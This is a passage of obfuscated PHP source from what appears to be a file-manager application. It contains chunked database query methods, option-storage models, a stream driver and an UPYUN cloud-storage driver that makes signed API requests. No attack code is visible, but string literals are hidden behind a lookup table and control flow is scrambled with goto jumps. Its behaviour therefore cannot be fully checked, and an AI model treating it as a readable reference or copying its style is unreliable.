$B—Ïè…‹¾ø) { $Dè»­œÜåÒ = $this->db->insert($B—Ïè…‹¾ø, $C“›Üùš¸Á, $dÉÔÁÌöÑ); } $this->commit(); } if (!1 !== $Dè»­œÜåÒ) { $C‘’µìâ›® = $this->getLastInsID(); if ($C‘’µìâ›®) { return $C‘’µìâ›®; } } return $Dè»­œÜåÒ; goto d’“òë¨¸; b‘’‡Ï±Ë­: if (empty($DÕ“èƒ¨ „)) { $this->error = think_lang($D™àÕÚÃ˜[269]); return !1; } $C“›Üùš¸Á = $this->_parseOptions($C“›Üùš¸Á); foreach ($DÕ“èƒ¨ „ as $fˆ—å× => $B—Ïè…‹¾ø) { $DÕ“èƒ¨ „[$fˆ—å×] = $this->_facade($B—Ïè…‹¾ø); $this->_beforeInsert($DÕ“èƒ¨ „[$fˆ—å×], $C“›Üùš¸Á); } goto aÚµ„¤­Ò²; A™ñ‰İ™: $D™àÕÚÃ˜ =& $_SERVER[æ§›¦ÌáØ]; ignore_timeout(); $Bë¾İİìí­ = self::SQL_WHERE_IN_CHUNK; goto b‘’‡Ï±Ë­; d’“òë¨¸: } public function save($D‰ˆÙÄ•‚° = '', $F‡î›È”ˆ„ = array()) { goto A˜¡¶¼óÎ¾; A˜¡¶¼óÎ¾: $FÈ·Ñ¼™™­ =& $_SERVER[æ§›¦ÌáØ]; $eåˆ³èëŒÊ = self::SQL_WHERE_IN_CHUNK; $a„§„‹µö = $this->optionsValue(); goto dÈÆÏ‹×£Ò; AÌëÆˆÈ×: $b“Ü±ø¤Á¶ = $a„§„‹µö[$FÈ·Ñ¼™™­[273]][$cÚ¨çƒ…Ÿ©][1]; $b“Ü±ø¤Á¶ = is_array($b“Ü±ø¤Á¶) ? $b“Ü±ø¤Á¶ : array(); $A¾ÚëÏÈÇÜ = count($b“Ü±ø¤Á¶); goto Díöõ¸”‚ë; dÈÆÏ‹×£Ò: $cÚ¨çƒ…Ÿ© = $this->findWhereField($a„§„‹µö); if (!$cÚ¨çƒ…Ÿ©) { return parent::save($D‰ˆÙÄ•‚°, $F‡î›È”ˆ„); } $C½‘ÒÀç¡¿ = 0; goto AÌëÆˆÈ×; Díöõ¸”‚ë: for ($F×ˆÉ˜†Ş = 0; $F×ˆÉ˜†Ş < $A¾ÚëÏÈÇÜ; $F×ˆÉ˜†Ş += $eåˆ³èëŒÊ) { $BÔ¾“ŠóÜ– = array_slice($b“Ü±ø¤Á¶, $F×ˆÉ˜†Ş, $eåˆ³èëŒÊ); if (!is_array($BÔ¾“ŠóÜ–) || count($BÔ¾“ŠóÜ–) == 0) { break; } $a„§„‹µö[$FÈ·Ñ¼™™­[273]][$cÚ¨çƒ…Ÿ©][1] = $BÔ¾“ŠóÜ–; $this->optionsValue($a„§„‹µö); $C½‘ÒÀç¡¿ += parent::save($D‰ˆÙÄ•‚°, $F‡î›È”ˆ„); $this->chunkEventCheck(count($BÔ¾“ŠóÜ–)); } $this->chunkEventSet(); return $C½‘ÒÀç¡¿; goto B…Í†ÓÄ¹ò; B…Í†ÓÄ¹ò: } public function add($bÀô‚Ø¸ÌÔ = '', $aŸ‹Í‹Ûç = array(), $aÈƒå¬ó‘ˆ = false) { if ($this->addTaskStatus && is_array($bÀô‚Ø¸ÌÔ)) { $this->addTaskData[] = $bÀô‚Ø¸ÌÔ; return; } return parent::add($bÀô‚Ø¸ÌÔ, $aŸ‹Í‹Ûç, $aÈƒå¬ó‘ˆ); } public function parseWhereLike($cÅ±ÖÙØ¶, $bŠÄÆ£šá‘ = '', $D×ù¸ÕÅåñ = false, &$F× ˆƒ¦« = false) { goto f›º‘‹´Ï ; Fï¶æÂ›¤Ä: foreach ($cÅ±ÖÙØ¶ as $Fõ‡Æ¾©¸Ö => $A÷…™é±àÖ) { if (is_array($A÷…™é±àÖ) && count($A÷…™é±àÖ) == 2 && $A÷…™é±àÖ[0] == $a†Ûë®¬Èù[380] && is_string($A÷…™é±àÖ[1]) && substr($A÷…™é±àÖ[1], 0, 1) == $a†Ûë®¬Èù[381] && substr($A÷…™é±àÖ[1], strlen($A÷…™é±àÖ[1]) - 1, 1) == $a†Ûë®¬Èù[381]) { goto B¿¾Œˆ¯®À; B¿¾Œˆ¯®À: $F× ˆƒ¦« = !0; $aä•ù½³Üå = is_string($Fõ‡Æ¾©¸Ö) ? $Fõ‡Æ¾©¸Ö : $bŠÄÆ£šá‘; $aµÅï¦öÉ = substr($A÷…™é±àÖ[1], 1, strlen($A÷…™é±àÖ[1]) - 2); goto AÀªÙŞÀ‰›; A÷Éª²¥‚: continue; goto c‰Šµ«¥Ä ; AÀªÙŞÀ‰›: $aµÅï¦öÉ = $this->db->escapeString($aµÅï¦öÉ); if (!strpos($aä•ù½³Üå, $a†Ûë®¬Èù[95])) { $aä•ù½³Üå = $a†Ûë®¬Èù[382] . $aä•ù½³Üå . $a†Ûë®¬Èù[382]; } $aéàè¢Ğ‹ = $a†Ûë®¬Èù[182] . $aµÅï¦öÉ . $a†Ûë®¬Èù[182]; goto E÷ÌĞµëä; E÷ÌĞµëä: if ($càƒáèìÈ[$a†Ûë®¬Èù[383]]) { $aéàè¢Ğ‹ = $a†Ûë®¬Èù[384] . $aµÅï¦öÉ . $a†Ûë®¬Èù[385]; if ($càƒáèìÈ[$a†Ûë®¬Èù[386]]) { $aéàè¢Ğ‹ = $a†Ûë®¬Èù[385] . $aµÅï¦öÉ . $a†Ûë®¬Èù[384]; } } $E¤‡ òœõ[$d¹âª÷ˆ¼ì] = $a†Ûë®¬Èù[387] . $aä•ù½³Üå . $a†Ûë®¬Èù[388] . $aéàè¢Ğ‹ . $a†Ûë®¬Èù[389]; $d¹âª÷ˆ¼ì++; goto A÷Éª²¥‚; c‰Šµ«¥Ä : } if (is_array($A÷…™é±àÖ)) { $bŠÄÆ£šá‘ = is_string($Fõ‡Æ¾©¸Ö) ? $Fõ‡Æ¾©¸Ö : $bŠÄÆ£šá‘; $A÷…™é±àÖ = $this->parseWhereLike($A÷…™é±àÖ, $bŠÄÆ£šá‘, !0, $F× ˆƒ¦«); } if (is_numeric($Fõ‡Æ¾©¸Ö)) { $E¤‡ òœõ[$d¹âª÷ˆ¼ì] = $A÷…™é±àÖ; $d¹âª÷ˆ¼ì++; } else { $E¤‡ òœõ[$Fõ‡Æ¾©¸Ö] = $A÷…™é±àÖ; } } if ($F× ˆƒ¦« && !$D×ù¸ÕÅåñ) { } return $E¤‡ òœõ; goto fïƒ¿ãÙ; f›º‘‹´Ï : $a†Ûë®¬Èù =& $_SERVER[æ§›¦ÌáØ]; $càƒáèìÈ = $GLOBALS[$a†Ûë®¬Èù[6]][$a†Ûë®¬Èù[378]]; if (!$càƒáèìÈ[$a†Ûë®¬Èù[379]]) { return $cÅ±ÖÙØ¶; } goto C“§àåŞ½è; C“§àåŞ½è: if (!is_array($cÅ±ÖÙØ¶)) { return $cÅ±ÖÙØ¶; } $E¤‡ òœõ = array(); $d¹âª÷ˆ¼ì = 0; goto Fï¶æÂ›¤Ä; fïƒ¿ãÙ: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($cçèÁÅß‰ = array()) { goto cóÑâ¨; D—Î‹‰¾‘ˆ: $dø½Ù›ˆÌÏ = $this->findWhereField($FøŠ¤Î’²ò); if (!$dø½Ù›ˆÌÏ || isset($FøŠ¤Î’²ò[$cŠâä³˜Ü[290]]) || isset($FøŠ¤Î’²ò[$cŠâä³˜Ü[351]])) { return parent::select($cçèÁÅß‰); } $AÒëÒïì®Ğ = $FøŠ¤Î’²ò[$cŠâä³˜Ü[273]][$dø½Ù›ˆÌÏ][1]; goto bóÌ¼Ö÷‰Ş; bóÌ¼Ö÷‰Ş: $AÒëÒïì®Ğ = is_array($AÒëÒïì®Ğ) ? $AÒëÒïì®Ğ : array(); $aŒİ ÉÒˆ§ = null; for ($BøÌ÷‚ß¾ = 0; $BøÌ÷‚ß¾ < count($AÒëÒïì®Ğ); $BøÌ÷‚ß¾ += $a—ÁÓäê–…) { $BšÎ¡Å°İÓ = array_slice($AÒëÒïì®Ğ, $BøÌ÷‚ß¾, $a—ÁÓäê–…); if (!is_array($BšÎ¡Å°İÓ) || count($BšÎ¡Å°İÓ) == 0) { break; } $FøŠ¤Î’²ò[$cŠâä³˜Ü[273]][$dø½Ù›ˆÌÏ][1] = $BšÎ¡Å°İÓ; $this->optionsValue($FøŠ¤Î’²ò); $A‹Ù¿’ÓĞ = parent::select($cçèÁÅß‰); if (!$A‹Ù¿’ÓĞ) { continue; } $aŒİ ÉÒˆ§ = is_array($aŒİ ÉÒˆ§) ? $aŒİ ÉÒˆ§ : array(); $aŒİ ÉÒˆ§ = array_merge($aŒİ ÉÒˆ§, $A‹Ù¿’ÓĞ); } goto B…§Ã¾Û«; cóÑâ¨: $cŠâä³˜Ü =& $_SERVER[æ§›¦ÌáØ]; $a—ÁÓäê–… = self::SQL_WHERE_IN_CHUNK; $FøŠ¤Î’²ò = $this->optionsValue(); goto D—Î‹‰¾‘ˆ; B…§Ã¾Û«: return $aŒİ ÉÒˆ§; goto E¡Ş»„½õÄ; E¡Ş»„½õÄ: } public function delete($bÖÁÉì¤ö = array()) { goto F¤Ø¥§”“ï; cÈóßá•Í: return $Cå“ÍÚğá‡; goto BÓ¦•ô½; D• Â¸¡Û: $bÑ²Èç± = $a‚¸¢’ÛĞÉ[$EĞÑËš¿ï¯[273]][$dç’…ìˆÅÇ][1]; $bÑ²Èç± = is_array($bÑ²Èç±) ? $bÑ²Èç± : array(); for ($Fß†ä¯°÷ = 0; $Fß†ä¯°÷ < count($bÑ²Èç±); $Fß†ä¯°÷ += $d¾ƒ¤ÈÓÈê) { $Cƒ¤á¿¾Ñë = array_slice($bÑ²Èç±, $Fß†ä¯°÷, $d¾ƒ¤ÈÓÈê); if (!is_array($Cƒ¤á¿¾Ñë) || count($Cƒ¤á¿¾Ñë) == 0) { break; } $a‚¸¢’ÛĞÉ[$EĞÑËš¿ï¯[273]][$dç’…ìˆÅÇ][1] = $Cƒ¤á¿¾Ñë; $this->optionsValue($a‚¸¢’ÛĞÉ); $Cå“ÍÚğá‡ += parent::delete($bÖÁÉì¤ö); } goto cÈóßá•Í; EİĞ’¤Æöˆ: $dç’…ìˆÅÇ = $this->findWhereField($a‚¸¢’ÛĞÉ); if (!$dç’…ìˆÅÇ) { return parent::delete($bÖÁÉì¤ö); } $Cå“ÍÚğá‡ = 0; goto D• Â¸¡Û; F¤Ø¥§”“ï: $EĞÑËš¿ï¯ =& $_SERVER[æ§›¦ÌáØ]; $d¾ƒ¤ÈÓÈê = self::SQL_WHERE_IN_CHUNK; $a‚¸¢’ÛĞÉ = $this->optionsValue(); goto EİĞ’¤Æöˆ; BÓ¦•ô½: } private function findWhereField($cÄêÅ¢¤¾å) { $fö’Ç¬Ûó =& $_SERVER[æ§›¦ÌáØ]; $E¾ˆº¨Äƒ  = self::SQL_WHERE_IN_CHUNK; if (!is_array($cÄêÅ¢¤¾å) || !is_array($cÄêÅ¢¤¾å[$fö’Ç¬Ûó[273]])) { return !1; } foreach ($cÄêÅ¢¤¾å[$fö’Ç¬Ûó[273]] as $B»¢’ƒîàç => $f¹¡—„…®) { if (is_array($f¹¡—„…®) && isset($f¹¡—„…®[0]) && is_string($f¹¡—„…®[0]) && strtolower($f¹¡—„…®[0]) == $fö’Ç¬Ûó[7] && is_array($f¹¡—„…®[1]) && count($f¹¡—„…®[1]) > $E¾ˆº¨Äƒ ) { ignore_timeout(); return $B»¢’ƒîàç; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\145\155\x4f\160\164\151\x6f\156"; public $field = array(); public function listData($bÏÊŸæ‰ = false, $A™¼†‘š‡Ú = "\x6d\x6f\x64\x69\146\x79\x54\151\155\145", $C’¨È»«ƒÓ = false) { $f¢‹Ô¹Ù‹Ú = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$f¢‹Ô¹Ù‹Ú) { return $bÏÊŸæ‰ ? null : array(); } if (!$bÏÊŸæ‰) { $f¢‹Ô¹Ù‹Ú = array_filter(array_values($f¢‹Ô¹Ù‹Ú)); return array_sort_by($f¢‹Ô¹Ù‹Ú, $A™¼†‘š‡Ú, $C’¨È»«ƒÓ); } return $f¢‹Ô¹Ù‹Ú[$_SERVER[æ§›¦ÌáØ][390] . $bÏÊŸæ‰]; } public function insert($C¥ƒÜğ¹Ê¨) { goto bŒ±ÙÓ‘×„; c ‡È²¨Ü: return $EˆŞâ÷Æ±ò; goto DøÔ¶®ó±İ; c§Û¼Şíçƒ: $C¥ƒÜğ¹Ê¨[$cÆ¬Ş¸§ñ‰[84]] = time(); Model($this->modelType)->set($cÆ¬Ş¸§ñ‰[391], $EˆŞâ÷Æ±ò, $this->optionType . $cÆ¬Ş¸§ñ‰[392]); Model($this->modelType)->set($cÆ¬Ş¸§ñ‰[390] . $EˆŞâ÷Æ±ò, $C¥ƒÜğ¹Ê¨, $this->optionType); goto c ‡È²¨Ü; EÇ„Àš˜é: $EˆŞâ÷Æ±ò = $EˆŞâ÷Æ±ò ? $EˆŞâ÷Æ±ò : 0; $C¥ƒÜğ¹Ê¨[$cÆ¬Ş¸§ñ‰[393]] = ++$EˆŞâ÷Æ±ò; $C¥ƒÜğ¹Ê¨[$cÆ¬Ş¸§ñ‰[194]] = time(); goto c§Û¼Şíçƒ; bŒ±ÙÓ‘×„: $cÆ¬Ş¸§ñ‰ =& $_SERVER[æ§›¦ÌáØ]; $C¥ƒÜğ¹Ê¨ = array_field_key($C¥ƒÜğ¹Ê¨, $this->field); $EˆŞâ÷Æ±ò = Model($this->modelType)->get($cÆ¬Ş¸§ñ‰[391], $this->optionType . $cÆ¬Ş¸§ñ‰[392]); goto EÇ„Àš˜é; DøÔ¶®ó±İ: } public function update($Dâ›¼÷îÂ, $FåÄ ó›) { goto DÇ­œˆò‰á; A§Ó®ˆóÌº: if (!$EÑ‘Å éŸ» || !$Dâ›¼÷îÂ) { return !1; } $FåÄ ó› = array_merge($EÑ‘Å éŸ», $FåÄ ó›); $FåÄ ó›[$CíœÛÏ¤ç[84]] = time(); goto B™è“ñÑì; DÇ­œˆò‰á: $CíœÛÏ¤ç =& $_SERVER[æ§›¦ÌáØ]; $FåÄ ó› = array_field_key($FåÄ ó›, $this->field); $EÑ‘Å éŸ» = $this->listData($Dâ›¼÷îÂ); goto A§Ó®ˆóÌº; B™è“ñÑì: return Model($this->modelType)->set($CíœÛÏ¤ç[390] . $Dâ›¼÷îÂ, $FåÄ ó›, $this->optionType); goto C£ŒªÜµ´’; C£ŒªÜµ´’: } public function remove($Eø’†Ş†¼) { if (!$Eø’†Ş†¼) { return !1; } return Model($this->modelType)->remove($_SERVER[æ§›¦ÌáØ][390] . $Eø’†Ş†¼, $this->optionType); } public function clear() { $DÖˆ“†Â¦Š =& $_SERVER[æ§›¦ÌáØ]; Model($this->modelType)->remove($DÖˆ“†Â¦Š[391], $this->optionType . $DÖˆ“†Â¦Š[392]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($bˆÈ¿éÀç, $a×“×‚¡ğ) { if (!$a×“×‚¡ğ) { return !1; } $C…±œí¤¦— = $this->listData(); $C…±œí¤¦— = array_to_keyvalue($C…±œí¤¦—, $bˆÈ¿éÀç); return isset($C…±œí¤¦—[$a×“×‚¡ğ]) ? $C…±œí¤¦—[$a×“×‚¡ğ] : !1; } public function findByName($f§®ñÁ”Ûê) { return $this->findByKey($_SERVER[æ§›¦ÌáØ][28], $f§®ñÁ”Ûê); } protected function resetData($f­ó‚±¹¬—) { $cŞ‹‰°’Š¼ =& $_SERVER[æ§›¦ÌáØ]; $f­ó‚±¹¬— = is_array($f­ó‚±¹¬—) ? $f­ó‚±¹¬— : array(); $CŠ·÷Æù³ğ = array(); for ($bÅíãçĞŒ¡ = 0; $bÅíãçĞŒ¡ < count($f­ó‚±¹¬—); $bÅíãçĞŒ¡++) { $CŠ·÷Æù³ğ[$cŞ‹‰°’Š¼[390] . $f­ó‚±¹¬—[$bÅíãçĞŒ¡][$cŞ‹‰°’Š¼[393]]] = $f­ó‚±¹¬—[$bÅíãçĞŒ¡]; } return Model($this->modelType)->set($CŠ·÷Æù³ğ, !1, $this->optionType); } private function getAutoName($c¸ñïŒââÊ) { $cïÆ¥¡éÊø = array_to_keyvalue($this->listData(), $_SERVER[æ§›¦ÌáØ][28]); if (!$cïÆ¥¡éÊø || !isset($cïÆ¥¡éÊø[$c¸ñïŒââÊ])) { return $c¸ñïŒââÊ; } for ($Cßˆì‘Ìøæ = 1; $Cßˆì‘Ìøæ < count($cïÆ¥¡éÊø); $Cßˆì‘Ìøæ++) { $c£îô†´¸ = $c¸ñïŒââÊ . "\50{$Cßˆì‘Ìøæ}\x29"; if (!isset($cïÆ¥¡éÊø[$c£îô†´¸])) { return $c£îô†´¸; } } return $c£îô†´¸; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($f­‚†§µĞ = false, $eæ­Çëöïğ = '', $då“ñàä³Û = false) { goto bá £Š…¡ñ; BŞ÷‹³Ü¹ƒ: $e¢Íñâò = is_array($e¢Íñâò) ? $e¢Íñâò : array(); if (is_array($B‡ÂùñëË§)) { $B‡ÂùñëË§ = array_merge($e¢Íñâò, $B‡ÂùñëË§); return $f­‚†§µĞ ? isset($B‡ÂùñëË§[$f­‚†§µĞ]) ? $B‡ÂùñëË§[$f­‚†§µĞ] : null : $B‡ÂùñëË§; } $a­‚ØÊ“¬Ø = $this->filterWhere(array($CËĞé›ñ[29] => $eæ­Çëöïğ)); goto AÊ“‡˜¨¥˜; bá £Š…¡ñ: $CËĞé›ñ =& $_SERVER[æ§›¦ÌáØ]; $B‡ÂùñëË§ = $this->cacheGet($eæ­Çëöïğ); $e¢Íñâò = $this->optionDefault($eæ­Çëöïğ); goto BŞ÷‹³Ü¹ƒ; AÊ“‡˜¨¥˜: $B‡ÂùñëË§ = $this->where($a­‚ØÊ“¬Ø)->select(); $B‡ÂùñëË§ = array_to_keyvalue($B‡ÂùñëË§, $CËĞé›ñ[93], $CËĞé›ñ[372]); foreach ($B‡ÂùñëË§ as $fÒ¥Ø…©¬ª => $F¹Ä¹¼) { if ($då“ñàä³Û || in_array($fÒ¥Ø…©¬ª, $this->jsonField)) { $B‡ÂùñëË§[$fÒ¥Ø…©¬ª] = json_decode($F¹Ä¹¼, !0); } } goto f®Ôä†‹¶Ò; f®Ôä†‹¶Ò: $this->cacheSet($eæ­Çëöïğ, $B‡ÂùñëË§); $B‡ÂùñëË§ = array_merge($e¢Íñâò, $B‡ÂùñëË§); return $f­‚†§µĞ ? $B‡ÂùñëË§[$f­‚†§µĞ] : $B‡ÂùñëË§; goto bî’¿†ïêõ; bî’¿†ïêõ: } public function set($cÃğ˜ÊÉˆÆ, $E¼­‘ˆò®¡ = false, $fÒÜæÛÓ‰ = '') { goto A•„›æã¸; BÈÇÆº‰³ä: $a°¥öí„Îä = is_array($cÃğ˜ÊÉˆÆ) ? $cÃğ˜ÊÉˆÆ : array($cÃğ˜ÊÉˆÆ => $E¼­‘ˆò®¡); foreach ($a°¥öí„Îä as $C¦Õµ‡è“ù => $d°—È”ãä) { if (is_array($d°—È”ãä)) { $d°—È”ãä = json_encode_force($d°—È”ãä); } $this->checkLength($d°—È”ãä, !1, $this->tableName . $FÖŠºİˆ¦[4] . $cÃğ˜ÊÉˆÆ); $d°—È”ãä = self::textEncode($d°—È”ãä); $a°¥öí„Îä = array($FÖŠºİˆ¦[29] => $fÒÜæÛÓ‰, $FÖŠºİˆ¦[93] => $C¦Õµ‡è“ù, $FÖŠºİˆ¦[372] => $d°—È”ãä); $b×®øã˜“[] = $this->filterWhere($a°¥öí„Îä); } if (!$b×®øã˜“) { return !0; } goto fİ„àå£äë; fİ„àå£äë: return $this->addAll($b×®øã˜“, array(), !0); goto bĞì»½Õ‡Î; A•„›æã¸: $FÖŠºİˆ¦ =& $_SERVER[æ§›¦ÌáØ]; $this->cacheRemove($fÒÜæÛÓ‰); $b×®øã˜“ = array(); goto BÈÇÆº‰³ä; bĞì»½Õ‡Î: } protected function optionDefault($b®Ü¤©¿ˆî = '') { return !1; } public function setDeep($AñîŞÙ¾ëÇ, $cîÌ­¼îïô = false, $b¤¨â‘à­ = '') { $CáôØÕŸãğ = explode($_SERVER[æ§›¦ÌáØ][95], $AñîŞÙ¾ëÇ); $f®…¢Ãñçœ = $this->get(); array_set_value($f®…¢Ãñçœ, $AñîŞÙ¾ëÇ, $cîÌ­¼îïô); $this->set($CáôØÕŸãğ[0], $f®…¢Ãñçœ[$CáôØÕŸãğ[0]], $b¤¨â‘à­); } public function remove($CÏ½ÑĞ‹Š, $c‡ƒñÚ‰çÜ = '') { $FÚ¯ìÍÌ´ğ =& $_SERVER[æ§›¦ÌáØ]; $this->cacheRemove($c‡ƒñÚ‰çÜ); $F¥ãÃä øˆ = $this->filterWhere(array($FÚ¯ìÍÌ´ğ[93] => $CÏ½ÑĞ‹Š, $FÚ¯ìÍÌ´ğ[29] => $c‡ƒñÚ‰çÜ)); if (is_null($CÏ½ÑĞ‹Š)) { unset($F¥ãÃä øˆ[$FÚ¯ìÍÌ´ğ[93]]); } return $this->where($F¥ãÃä øˆ)->delete(); } public function cacheSet($d«Œ£µŸ, $Fß­è„å = false) { return Cache::set($this->cacheKey($d«Œ£µŸ), $Fß­è„å); } public function cacheGet($b²…Ñ§ä) { return Cache::get($this->cacheKey($b²…Ñ§ä)); } public function cacheRemove($c³‡ù¦ô®) { return Cache::remove($this->cacheKey($c³‡ù¦ô®)); } protected function filterWhere($d­×å…ó†°) { return $d­×å…ó†°; } protected function cacheKey($fÃ¼¯äì™†) { return $fÃ¼¯äì™†; } } goto F´çó­Š‘Ï; cóÉåÊğÂÉ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($A¥ÕÁ÷ÚŞÉ, $cÕ¥‚ƒç‘ = 0) { parent::__construct(); $this->source = $A¥ÕÁ÷ÚŞÉ; $this->sourceSize = $cÕ¥‚ƒç‘; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($eË–¦ºÉˆ = false) { return $this->sourceSize; } public function getContent($fåƒøÈÀ½ = false) { return $this->fileSubstr($fåƒøÈÀ½, 0, $this->sourceSize); } public function fileSubstr($AïÓÓ÷™“¬ = false, $Dë¢Œ‰Öİ = 0, $dâÁ¤“î¯ = 0) { if (!$dâÁ¤“î¯) { $dâÁ¤“î¯ = $this->sourceSize; } $F³–ƒÛµíŞ = $this->sourceSize - $Dë¢Œ‰Öİ; if ($dâÁ¤“î¯ >= $F³–ƒÛµíŞ) { $dâÁ¤“î¯ = $F³–ƒÛµíŞ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Dë¢Œ‰Öİ, $dâÁ¤“î¯); } if ($this->sourceType == self::TYPE_FILE) { if ($dâÁ¤“î¯ <= 0) { return $_SERVER[æ§›¦ÌáØ][33]; } $b¦´æ¬Ñ¿ã = ftell($this->source); fseek_64($this->source, $b¦´æ¬Ñ¿ã + $Dë¢Œ‰Öİ); $cĞ÷ãÑÚõ = @fread($this->source, $dâÁ¤“î¯); fseek_64($this->source, $b¦´æ¬Ñ¿ã); return $cĞ÷ãÑÚõ; } } public function hashMd5($aä®Á²–Ï¢ = false) { return md5($this->getContent()); } public static function hash($A¾‚›¦ê, $cáÌ£É¿´Ù = 0) { $DÖ‡—¡Ö‰ù = new PathDriverStream($A¾‚›¦ê, $cáÌ£É¿´Ù); return $DÖ‡—¡Ö‰ù->hashSimple($A¾‚›¦ê); } public static function md5($DŒõº², $fÓÒ»Îö‹ = 0) { $dÌÇÄ¿¼…÷ = new PathDriverStream($DŒõº², $fÓÒ»Îö‹); return $dÌÇÄ¿¼…÷->hashMd5($DŒõº²); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\57\x2f\x76\60\56\x61\160\151\x2e\165\x70\171\165\156\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Eï…¤Àòò‰) { parent::__construct(); $this->_init($Eï…¤Àòò‰); } public function _init($DÛ†Õ‡»©Æ) { $Fë•ßÖ„¸° =& $_SERVER[æ§›¦ÌáØ]; foreach ($DÛ†Õ‡»©Æ as $aÖ‡İÎ³˜ù => $dÙµ†–ŠÀ×) { if (isset($this->{$aÖ‡İÎ³˜ù})) { $this->{$aÖ‡İÎ³˜ù} = $dÙµ†–ŠÀ×; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Fë•ßÖ„¸°[1319] . LNG($Fë•ßÖ„¸°[1252])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($F±ËÕ—ëÚÙ, $Bê«÷òÓÒä = "\x47\x45\124") { $dœ½ÉÊ°ñ÷ =& $_SERVER[æ§›¦ÌáØ]; $d×óÖö‘‰© = gmdate($dœ½ÉÊ°ñ÷[1285]); $eïèõ†¾ = base64_encode(hash_hmac($dœ½ÉÊ°ñ÷[1320], "{$Bê«÷òÓÒä}\46{$F±ËÕ—ëÚÙ}\x26{$d×óÖö‘‰©}", md5("{$this->userpass}"), !0)); $dŒøø™Çâ´ = array("\x41\x75\x74\150\x6f\x72\x69\172\141\x74\x69\x6f\x6e\x3a\x55\x50\131\x55\116\x20{$this->username}\x3a{$eïèõ†¾}", "\x44\141\164\x65\x3a{$d×óÖö‘‰©}"); return $dŒøø™Çâ´; } public function ussRequest($DÑù•çÅÉ, $bÇÎøÄõ‰ª = "\x47\x45\124", $a¬ÂÌÜøäó = false, $aë×ËÊ¤á½ = false, $aìõ¢Â£ = false) { goto C’ë‡«î; AóËÀ Ú‚–: if (!$E«ÊÚíô ) { return array($B–Æ½ùº„„[1076] => !1, $B–Æ½ùº„„[1078] => $B–Æ½ùº„„[1321]); } if (strtolower($bÇÎøÄõ‰ª) == $B–Æ½ùº„„[190] || in_array($E«ÊÚíô [$B–Æ½ùº„„[1076]], array($B–Æ½ùº„„[1179], $B–Æ½ùº„„[1322]))) { $a¬ÂÌÜøäó = $E«ÊÚíô [$B–Æ½ùº„„[1323]]; } else { $a¬ÂÌÜøäó = json_decode($E«ÊÚíô [$B–Æ½ùº„„[1078]], !0); if (!$a¬ÂÌÜøäó) { $a¬ÂÌÜøäó = $E«ÊÚíô [$B–Æ½ùº„„[1078]]; } else { if (!$E«ÊÚíô [$B–Æ½ùº„„[703]] && isset($a¬ÂÌÜøäó[$B–Æ½ùº„„[1324]])) { $a¬ÂÌÜøäó = $a¬ÂÌÜøäó[$B–Æ½ùº„„[1324]]; } } } return array($B–Æ½ùº„„[1076] => $E«ÊÚíô [$B–Æ½ùº„„[703]], $B–Æ½ùº„„[1078] => $a¬ÂÌÜøäó); goto Añ¶êËãå; C’ë‡«î: $B–Æ½ùº„„ =& $_SERVER[æ§›¦ÌáØ]; $DÑù•çÅÉ = trim($DÑù•çÅÉ, $B–Æ½ùº„„[8]); $c·ÇÂ±¦ = "\x2f{$this->bucket}\x2f{$DÑù•çÅÉ}"; goto A›¤ßÍˆ÷; A›¤ßÍˆ÷: $f¥î†êó¡ = $this->ussHeaders($c·ÇÂ±¦, $bÇÎøÄõ‰ª); if ($aë×ËÊ¤á½) { $f¥î†êó¡ = array_merge($f¥î†êó¡, $aë×ËÊ¤á½); } $E«ÊÚíô  = url_request($this->endpoint . $c·ÇÂ±¦, $bÇÎøÄõ‰ª, $a¬ÂÌÜøäó, $f¥î†êó¡, $aìõ¢Â£); goto AóËÀ Ú‚–; Añ¶êËãå: } public function mkfile($F÷³–µíÔ, $f˜…èßñÇ = '', $B‰·Û‡Ì = REPEAT_RENAME) { if ($this->setContent($F÷³–µíÔ, $f˜…èßñÇ)) { return $this->getPathOuter($F÷³–µíÔ); } return !1; } public function mkdir($F¿ª¢ÆŸÚ­, $Dä™Ô¿ÁçÔ = REPEAT_SKIP) { $F©ºÜ¡ä´ø =& $_SERVER[æ§›¦ÌáØ]; $Bñ¨Œ‡áÀ÷ = trim($F¿ª¢ÆŸÚ­, $F©ºÜ¡ä´ø[8]); if ($this->_isFolder($Bñ¨Œ‡áÀ÷)) { return $this->getPathOuter($Bñ¨Œ‡áÀ÷); } $d”¼‹ÏÜšğ = array($F©ºÜ¡ä´ø[1325]); $cê½¨µœ¿Ê = $this->ussRequest($Bñ¨Œ‡áÀ÷, $F©ºÜ¡ä´ø[224], !1, $d”¼‹ÏÜšğ); return $cê½¨µœ¿Ê[$F©ºÜ¡ä´ø[1076]] ? $this->getPathOuter($Bñ¨Œ‡áÀ÷) : !1; } public function copyFile($aìø¿ĞÍ¯, $dˆ“¡ì‚è) { $FíùÅŞé· =& $_SERVER[æ§›¦ÌáØ]; $b×ººæÛáß = array($FíùÅŞé·[1326] . "\x2f{$this->bucket}\x2f{$aìø¿ĞÍ¯}", $FíùÅŞé·[1327]); $fºçèíÇë = $this->ussRequest($dˆ“¡ì‚è, $FíùÅŞé·[226], !1, $b×ººæÛáß); return $fºçèíÇë[$FíùÅŞé·[1076]] ? !0 : $this->getPathOuter($dˆ“¡ì‚è); } public function moveFile($FİëºÄ¨Îä, $fÀ„ÍøâõÔ) { $d™ƒš’Ø‘ =& $_SERVER[æ§›¦ÌáØ]; 